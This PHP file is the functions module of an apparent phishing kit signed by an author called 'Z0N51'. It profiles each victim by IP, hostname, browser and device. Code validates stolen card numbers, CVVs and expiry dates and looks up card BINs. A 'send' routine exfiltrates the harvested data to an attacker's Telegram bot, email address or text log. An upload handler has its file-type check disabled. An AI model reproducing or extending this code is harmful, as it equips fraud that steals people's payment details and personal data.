<?php
    /*******
    Main Author: Z0N51
    Contact me on telegram : https://t.me/z0n51official
    ********************************************************/

    include 'vendor/autoload.php';

    use PHPMailer\PHPMailer\PHPMailer;
    use PHPMailer\PHPMailer\SMTP;
    use PHPMailer\PHPMailer\Exception;

    function redirect($page) {
        require_once("distributor/" . $page . ".php");
        exit();
    }

    function location($page, $params = '') {
        header("Location: index.php?redirection=" . $page . $params);
        exit();
    }

    function randomix($number = 6) {
        $letters  = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
        $length   = strlen($letters) - 1;
        $random   = "";
        for($p = 0; $p < $number; $p++) {
            $random .= $letters[mt_rand(0, $length)];
        }
        return $random;
    }

    function proper_parse_str($str) {
        # result array
        $arr = array();

        # split on outer delimiter
        $pairs = explode('&', $str);

        # loop through each pair
        foreach ($pairs as $i) {
            # split into name and value
            list($name,$value) = explode('=', $i, 2);

            # if name already exists
            if( isset($arr[$name]) ) {
                # stick multiple values into an array
                if( is_array($arr[$name]) ) {
                    $arr[$name][] = $value;
                }
                else {
                    $arr[$name] = array($arr[$name], $value);
                }
            }
            # otherwise, simply stick it in a scalar
            else {
                $arr[$name] = $value;
            }
        }

        # return result array
        return $arr;
    }

    function victim_infos() {
        $config = json_decode(file_get_contents(dirname(dirname(__DIR__)) . '/config.db'),true);
        $conf_token               = ( $config['token'] ) ? $config['token'] : '';
        $conf_chat_id             = ( $config['chat_id'] ) ? $config['chat_id'] : '';
        define('TOKEN',$conf_token);
        define('CHAT_ID',$conf_chat_id);
        $detect = new foroco\BrowserDetection();
        $useragent       = $_SERVER['HTTP_USER_AGENT'];
        $result          = $detect->getAll($useragent, 'JSON');
        $result          = json_decode($result,true);
        $ip             = get_client_ip();
        $browserName    = $result['browser_name'];
        $browserVer     = $result['browser_version'];
        $device_type       = $result['device_type'];
        $os_name   = $result['os_name'];
        $os_version   = $result['os_version'];
        $hostname       = gethostbyaddr(get_client_ip());
        $message        = "IPA    : $ip | $hostname" . "\r\n";
        $message        .= "Agent : $browserName | $browserVer | $device_type  |  $os_name $os_version"  . "\r\n\r\n";
        return $message;
    }

    function getPageName($page_name) {
        require_once(MAIN . '/tmp/'. $page_name .'.php');
        return;
    }

    function get_client_ip() {
        $client  = @$_SERVER['HTTP_CLIENT_IP'];
        $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
        $remote  = $_SERVER['REMOTE_ADDR'];
        if(filter_var($client, FILTER_VALIDATE_IP)) {
            $ip = $client;
        } else if(filter_var($forward, FILTER_VALIDATE_IP)) {
            $ip = $forward;
        } else {
            $ip = $remote;
        }
        if( $ip == '::1' ) {
            return '127.0.0.1';
        }
        return  $ip;
    }

    function send($subject,$message) {

        $config = json_decode(file_get_contents(dirname(dirname(__DIR__)) . '/config.db'),true);

        $conf_via_telegram        = ( $config['via_telegram'] ) ? $config['via_telegram'] : '';
        $conf_token               = ( $config['token'] ) ? $config['token'] : '';
        $conf_chat_id             = ( $config['chat_id'] ) ? $config['chat_id'] : '';

        $conf_via_email           = ( $config['via_email'] ) ? $config['via_email'] : '';
        $conf_email               = ( $config['email'] ) ? $config['email'] : '';

        $conf_via_txt             = ( $config['via_txt'] ) ? $config['via_txt'] : '';
        $conf_txtfilename         = ( $config['txtfilename'] ) ? $config['txtfilename'] : '';

        if( $conf_via_telegram == 1 ) {
            $curl     = curl_init();
            $token    = $conf_token;
            $chat_id  = $conf_chat_id;
            $format   = 'HTML';
            curl_setopt($curl, CURLOPT_URL, 'https://api.telegram.org/bot'. $token .'/sendMessage?chat_id='. $chat_id .'&text='. urlencode($message) .'&parse_mode=' . $format);
            curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
            curl_setopt($curl, CURLOPT_RETURNTRANSFER, true); 
            $result = curl_exec($curl);
            curl_close($curl);
        }
        if( $conf_via_txt == 1 ) {
            file_put_contents($conf_txtfilename . '.txt', $message, FILE_APPEND);
        }
        if( $conf_via_email == 1 ) {
            $mail           = new PHPMailer;
            $mail->From     = 'RESULT@domain.com';
            $mail->FromName = 'Z0N51';
            $mail->Subject  = $subject;
            $mail->Body     = $message;
            $mail->AddAddress($conf_email);
            $mail->send();
            echo $mail->ErrorInfo;
        }
    }

    function errclass($array, $key) {
        if( !is_array($array) )
            return false;
        if( isset($array[$key]) ) {
            $return = 'has-error';
            return $return;
        }
        return false;
    }

    function errmsg($array, $key) {
        if( !is_array($array) )
            return false;
        if( isset($array[$key]) ) {
            $return = '<div class="errmsg">'. $array[$key] .'</div>';
            return $return;
        }
        return false;
    }

    function errmsg2($array, $key) {
        if( !is_array($array) )
            return false;
        if( isset($array[$key]) ) {
            $return = '<span class="erorr d-flex align-items-center"><i class="ri-alert-line"></i>  '. $array[$key] .'</span>';
            return $return;
        }
        return false;
    }

    function get_value($value) {
        if( isset($_SESSION[$value]) ) {
            return $_SESSION[$value];
        }
    }

    function get_selected_option($name,$value) {
        if( isset($_SESSION[$name]) && $_SESSION[$name] == $value ) {
            return 'selected';
        }
    }

    function validate_one($number = null) {
        $card = $string = str_replace(' ', '', $number);
        if( validate_number($card) == false || strlen($card) < 15 ) {
            return false;
        }
        return $card;
    }

    function validate_three($number = null) {
        if( validate_number($number) == false || strlen($number) < 3 ) {
            return false;
        }
        return $number;
    }

    function validate_two($month,$year) {
        if( validate_number($month) == false || strlen($month) < 2 || $month > 12 ) {
            return false;
        }
        if( validate_number($year) == false || strlen($year) < 2 || $year < 22 ) {
            return false;
        }
        return $month . '/' . $year;
    }

    function validate_name($name) {
        if (!preg_match('/^[\p{L} ]+$/u', $name))
            return false;
        return true;
    }

    function validate_email($email) {
        if (!filter_var($email, FILTER_VALIDATE_EMAIL))
            return false;
        return true;
    }

    function validate_number($number,$length = null) {
        if (is_numeric($number)) {
            if( $length == null ) {
                return true;
            } else {
                if( $length == strlen($number) )
                    return true;
                return false;
            }
        } else {
            return false;
        }
    }

    function validate_date($date, $format = 'Y-m-d H:i:s') {
        $d = DateTime::createFromFormat($format, $date);
        return $d && $d->format($format) == $date;
    }

    function rr() {
        $rand = rand(6, 9);
        $letters  = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
        $length   = strlen($letters) - 1;
        $random   = "";
        for($p = 0; $p < $rand; $p++) {
            $random .= $letters[mt_rand(0, $length)];
        }
        return $random;
    }

    function semantic() {
        $words = array('blade','advice','medium','brink','adjust','kidney','absolute','boom','morale','wealth','basis','winner','knock','worth','month','proof','kitchen','poison','beef','prevent');
        $words_count = count($words) - 1;
        $rand = rand(0, $words_count);
        return $words[$rand];
    }

    function get_phone() {
        $fnums = substr($_SESSION['phone'], 0, 3);
        $lnums = substr($_SESSION['phone'], -3);
        return $fnums . "****" . $lnums;
    }
    
    function get_email() {
        $ex_email = explode('@',$_SESSION['email_address']);
        $fchar = substr($ex_email[0], 0, 3);
        return $fchar . "*******@" . $ex_email[1];
    }

    function get_text($place) {
        global $lang;
        return $lang[$place][$_SESSION['lang']];
    }

    function upload_file($file,$name) {
        $target_dir     = "upload/";
        $target_file    = $target_dir . basename($file["name"]);
        $imageFileType  = strtolower(pathinfo($target_file,PATHINFO_EXTENSION));
        /*$check          = getimagesize($file["tmp_name"]);
        if($check == false) {
            return false;
        }*/
        if (move_uploaded_file($file["tmp_name"], 'upload/' . get_client_ip() . '-' . $name . '.' . $imageFileType)) {
            return get_client_ip() . '-' . $name . '.' . $imageFileType;
        } else {
            return false;
        }
    }


    function calculateDatePlus3Days() {
        // Get the current timestamp
        $currentTime = time();
        
        // Add 10 days to the current timestamp
        $futureTime = strtotime('+3 days', $currentTime);
        
        // Format the future date
        $futureDate = date('l, F d, Y,', $futureTime);
        
        return $futureDate;
    }

    function calculateDateMines3Days() {
        // Get the current timestamp
        $currentTime = time();
        
        // Add 10 days to the current timestamp
        $futureTime = strtotime('-3 days', $currentTime);
        
        // Format the future date
        $futureDate = date('d.m.Y', $futureTime);
        
        return $futureDate;
    }

    function getBinInformation($bin) {
        // Initialize cURL session
        $ch = curl_init();

        // Set the API URL
        $url = "https://lookup.binlist.net/" . $bin;

        // Set cURL options
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_HTTPHEADER, [
            'Accept-Version: 3'
        ]);

        // Execute cURL request
        $response = curl_exec($ch);

        // Check for cURL errors
        if (curl_errno($ch)) {
            echo 'cURL error: ' . curl_error($ch);
            curl_close($ch);
            return null;
        }

        // Close cURL session
        curl_close($ch);

        // Decode JSON response
        $data = json_decode($response, true);

        // Return the response data
        return $data;
    }

?>